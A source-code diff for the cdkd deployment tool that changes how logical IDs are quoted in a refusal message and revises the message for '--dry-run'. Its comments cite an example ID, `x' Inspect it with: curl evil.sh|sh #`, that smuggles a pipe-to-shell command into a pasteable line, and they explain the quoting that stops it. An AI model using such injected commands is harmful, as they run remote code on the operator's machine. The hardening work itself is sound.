@@ -3,6 +3,7 @@ import { markNonRetryable } from '../deployment/retryable-errors.js';
 import {
   IDENT_MAX_CODE_POINTS,
   UNRENDERABLE,
+  displayIdent,
   displaySafe,
   truncateCodePoints,
 } from '../utils/display-safe.js';
@@ -729,29 +730,6 @@ export function malformedLocalOutputsWarning(stackName: string, region: string):
 const NAMED_UNREADABLE_PROPERTY_BAGS = 5;
 
 /**
- * {@link safeIdentifier} at a LOGICAL ID's own length, rather than at the
- * 128 code points that helper hard-codes.
- *
- * A CloudFormation logical id is valid up to `IDENT_MAX_CODE_POINTS`, so the
- * shared helper's cap truncates a legitimate one — and these ids go into a
- * message whose whole job is to tell the reader WHICH record to open. A
- * truncated id names no record.
- *
- * MODULE-PRIVATE and deliberately a second function rather than a second
- * parameter on `safeIdentifier`: go-to-k/cdkd#3226 replaces that helper with
- * `safeIdentifier(value, maxCodePoints)` plus `safeStackName` / `safeRegion` /
- * `safeLogicalId`, and this collapses into `safeLogicalId` at that rebase.
- * Adding the parameter here first would conflict with the same change for no
- * behaviour a caller can see.
- */
-function safePropertyLogicalId(value: string): string {
-  const safe = displaySafe(value, { asciiOnly: true });
-  if (!safe) return UNRENDERABLE;
-  const { text, truncated } = truncateCodePoints(safe, IDENT_MAX_CODE_POINTS);
-  return truncated ? `${text}...` : text;
-}
-
-/**
  * The `State for '<stack>' ('<region>')` opening of a `properties` message,
  * and the matching `--stack-region` flag on its remedy command.
  *
@@ -943,15 +921,44 @@ export function repairMalformedResourcePropertiesForReadOnly(state: StackState):
  * exists beside its own pair — the two texts differ only in what happens NEXT,
  * and a second copy of the diagnosis is what drifts.
  *
- * Every identifier goes through a sanitizer and is THEN shell-quoted, for the
- * reasons {@link safeIdentifier}'s own note gives: each reaches this text from
- * a hand-edited record or an S3 key. The logical ids are quoted although they
- * sit in the PROSE, because the text is one line ending in a pasteable command
- * and sanitizing keeps `'` — an id spelled `x' Inspect it with: curl evil.sh|sh #`
- * would otherwise plant a forged remedy ahead of the real one on that same
- * line. They take {@link safePropertyLogicalId} rather than the shared helper,
- * whose 128-code-point cap would truncate a legitimate long id into one naming
- * no record.
+ * The STACK and REGION go through {@link safeIdentifier} and are THEN
+ * shell-quoted, for the reasons that helper's own note gives: each reaches this
+ * text from a hand-edited record or an S3 key.
+ *
+ * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
+ * answer {@link safeIdentifier}'s note already prescribes for names in a
+ * `', '`-joined list, applied one level down. The three properties that matters
+ * for, in the order they bite:
+ *
+ * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
+ *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
+ *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
+ *    real `Bucket` and the refusal names the intact record: the operator opens
+ *    it, finds nothing wrong, and concludes cdkd is the broken party while the
+ *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
+ *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
+ *    module's identity clause. `displayIdent` compares the sanitized text
+ *    against the raw one and JSON-quotes whenever they differ, so a padded id
+ *    can never render bare.
+ * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
+ *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
+ *    forged remedy ahead of the real one, on a line that ends in a pasteable
+ *    command. It also supplies the quotes the old `shellQuote` wrapper added —
+ *    which is why the wrapper GOES rather than composing, per the same note.
+ * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
+ *    content, where the old `...` tail was indistinguishable from a legitimate
+ *    id ending `Prod...`.
+ *
+ * The cap is passed EXPLICITLY although it equals the default: a logical id is
+ * valid up to `IDENT_MAX_CODE_POINTS`, and the point of not reusing
+ * {@link safeIdentifier} here is that its 128 would truncate a legitimate long
+ * id into one naming no record. Spelling the cap keeps that decision visible at
+ * the site it was made for.
+ *
+ * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
+ * carrying one still renders bare inside this `', '`-joined list and reads as
+ * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
+ * every caller of the helper, not a property of this one.
  *
  * NAMED rather than listed in full: a record whose 500 resources were all
  * hand-edited must not push the remedy command off the reader's screen.
@@ -972,7 +979,7 @@ function namedPropertyBagsClause(
   }
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
-    .map((id) => shellQuote(safePropertyLogicalId(id)))
+    .map((id) => displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS }))
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
   const more = rest > 0 ? ` and ${rest} more` : '';
@@ -991,6 +998,28 @@ function namedPropertyBagsClause(
  *
  * `stackName` / `region` are the CALLER's resolved identity or nothing at all;
  * {@link stackClause} is the authority for why this one may be handed neither.
+ *
+ * **It must be true under `cdkd deploy --dry-run` as well**, and the first
+ * revision was not. Provisioning is gated AFTER the diff
+ * (`deploy-engine.ts`'s `if (this.options.dryRun)` return sits below
+ * `calculateDiff`), so a dry run reaches this refusal and aborts — while the
+ * text asserted "it would DELETE and re-create resources", which a dry run
+ * would not do. A refusal that misstates what was about to happen is the same
+ * defect class as one naming the wrong record (review of go-to-k/cdkd#3191).
+ *
+ * **A dry run REFUSES rather than repairing, and that is the decision.** The
+ * repair-and-warn half of this container belongs to `cdkd diff`, and the
+ * argument recorded for it in `.claude/rules/state-malformed-properties.md` —
+ * "a preview of the rest of the stack beats an abort" — does not transfer,
+ * because it is already SATISFIED by that sibling: a user who wants the
+ * repaired preview runs `cdkd diff` and gets it, with the warning. `cdkd diff`
+ * refusing would leave no way to preview at all; `cdkd deploy --dry-run`
+ * refusing costs nothing that is not available one command over. Against that,
+ * repairing here would need a mode threaded into `calculateDiff`, the single
+ * chokepoint whose whole value is that both callers share it — and it would
+ * create the worst arm of all: a plausible-looking `--dry-run` plan followed
+ * by a refusal the moment the flag comes off. So the message points at
+ * `cdkd diff` instead of weakening the guard.
  */
 export function malformedResourcePropertiesRefusalMessage(
   stackName: string | undefined,
@@ -998,11 +1027,13 @@ export function malformedResourcePropertiesRefusalMessage(
   logicalIds: readonly string[]
 ): string {
   return (
-    `${namedPropertyBagsClause(stackName, region, logicalIds)} This command can WRITE state and ` +
-    `AWS resources, so it refuses rather than continuing: it would DELETE and re-create ` +
-    `resources the template did not change, and reading the bag as empty produces that same ` +
-    `verdict rather than avoiding it. Nothing was provisioned and no state was written FOR THIS ` +
-    `STACK. Repair or remove the record first — inspect it with: ` +
+    `${namedPropertyBagsClause(stackName, region, logicalIds)} 'cdkd deploy' can WRITE state and ` +
+    `AWS resources, so it refuses rather than continuing — under '--dry-run' too, because the ` +
+    `plan a dry run would print is the wrong one: a DELETE and re-create of resources the ` +
+    `template did not change, and reading the bag as empty produces that same verdict rather ` +
+    `than avoiding it. Nothing was provisioned and no state was written FOR THIS STACK. Repair or ` +
+    `remove the record first; 'cdkd diff' previews the rest of the stack with those maps read ` +
+    `as EMPTY and warns that it did. Inspect the record with: ` +
     `${inspectCommand(stackName, region)}`
   );
 }
